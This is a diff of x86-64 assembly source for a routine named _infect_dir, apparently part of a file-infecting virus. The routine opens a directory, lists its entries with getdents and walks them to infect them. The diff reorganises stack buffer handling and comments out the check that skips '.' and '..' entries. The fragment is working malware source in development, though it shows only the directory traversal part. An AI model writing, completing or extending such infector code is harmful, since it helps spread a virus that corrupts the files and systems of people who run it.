@@ -113,7 +113,6 @@ _infect_dir:; (string rdi)
 	%ifdef DEBUG
 		call _print; _print(rdi)
 	%endif
-	sub rsp, 1024; buffer of 1024 on stack
 	push 2
 	pop rax; open
 	push 0o0200000; O_RDONLY | O_DIRECTORY
@@ -127,6 +126,8 @@ _infect_dir:; (string rdi)
 	push rax
 	pop r13; fd
 
+	push r12
+	sub rsp, 1024
 	.getdents:
 		mov rdi, r13
 		push 78
@@ -135,7 +136,6 @@ _infect_dir:; (string rdi)
 		pop rdx; size of buffer
 		mov rsi, rsp; buffer
 		syscall
-		push r12
 		push rsi
 		pop r12
 		cmp rax, 0x0
@@ -152,26 +152,27 @@ _infect_dir:; (string rdi)
 		; if not . .. +18
 		add rdi, 18; linux_dir->d_name
 		
+; ft_strcmp with '.' and '..' to not infect_dir with them
 		push rcx
-		lea rsi, [rel dotdir]
-		xor rcx, rcx; = 0
-		.loop_array_string:
-			add rsi, rcx
-			push rcx
-			push rdx
-			call _ft_strcmp
-			pop rdx
-			pop rcx
-			cmp rax, 0
-			je .next_dir
-			xor rcx, rcx; = 0
-			.next_string:; seek next dir
-				inc rcx
-				cmp byte[rsi + rcx], 0x0
-				jnz .next_string
-			inc rcx
-			cmp byte[rsi + rcx], 0x0
-			jnz .loop_array_string
+;		lea rsi, [rel dotdir]
+;		xor rcx, rcx; = 0
+;		.loop_array_string:
+;			add rsi, rcx
+;			push rcx
+;			push rdx
+;			call _ft_strcmp
+;			pop rdx
+;			pop rcx
+;			cmp rax, 0
+;			je .next_dir
+;			xor rcx, rcx; = 0
+;			.next_string:; seek next dir
+;				inc rcx
+;				cmp byte[rsi + rcx], 0x0
+;				jnz .next_string
+;			inc rcx
+;			cmp byte[rsi + rcx], 0x0
+;			jnz .loop_array_string
 
 		%ifdef DEBUG
 			push rdx
@@ -198,9 +199,9 @@ _infect_dir:; (string rdi)
 		pop rdi
 
 	.return:
-		add rsp, 1024
 		push rdi
 		pop rsi
+		add rsp, 1024
 		pop r12
 ret
 
